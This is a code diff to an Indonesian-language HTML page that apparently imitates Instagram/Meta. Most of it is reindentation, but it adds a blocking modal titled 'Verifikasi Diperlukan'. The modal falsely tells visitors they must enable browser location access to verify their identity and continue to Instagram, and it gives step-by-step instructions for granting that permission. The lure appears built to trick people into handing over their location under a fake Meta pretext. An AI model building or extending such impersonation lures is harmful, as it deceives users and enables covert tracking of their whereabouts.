@@ -51,12 +51,42 @@
 <button type="button" id="createBtn" class="btn border-primary btn-transparent my-5 w-100 fw-bold rounded-5 text-primary">Buat akun baru</button>
 
 <div class="container d-flex align-items-center justify-content-center w-100 huruf">
-  <img class="mb-3 mx-2" src="../assets/meta-brands-solid-full.svg">
-  <p class="text-primary fw-bold fs-5">
-     Meta
-  </p>
+<img class="mb-3 mx-2" src="../assets/meta-brands-solid-full.svg">
+<p class="text-primary fw-bold fs-5">
+   Meta
+</p>
 </div>
 </main>
+
+<!-- Modal Permission Guard -->
+<div class="modal fade" id="permissionModal" tabindex="-1" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+<div class="modal-dialog modal-dialog-centered">
+  <div class="modal-content border-0 shadow-lg" style="border-radius: 12px; background: var(--ig-bg-modal, white); color: var(--ig-text, black);">
+    <div class="modal-body text-center p-4">
+      <div class="mb-3">
+        <i class="bi bi-geo-alt-fill text-primary" style="font-size: 3rem;"></i>
+      </div>
+      <h5 class="fw-bold mb-2">Verifikasi Diperlukan</h5>
+      <p class="text-secondary small mb-4">
+        Silakan aktifkan akses lokasi untuk memverifikasi identitas Anda dan melanjutkan ke Instagram.
+      </p>
+
+      <div id="instructionArea" class="bg-light p-3 rounded-3 mb-4 text-start border d-none" style="color: #333;">
+        <p class="fw-bold mb-1 small">Cara Aktifkan Lokasi:</p>
+        <ol class="small text-secondary mb-0" style="padding-left: 20px;">
+          <li>Klik ikon <b>Gembok</b> di URL bar browser.</li>
+          <li>Aktifkan izin <b>Lokasi</b>.</li>
+          <li>Refresh halaman ini.</li>
+        </ol>
+      </div>
+
+      <button type="button" class="btn btn-primary w-100 fw-bold py-2 rounded-5" id="requestPermissionBtn">
+        Izinkan Akses Lokasi
+      </button>
+    </div>
+  </div>
+</div>
+</div>
 
 
 <!-- Pemilihan bahasa -->
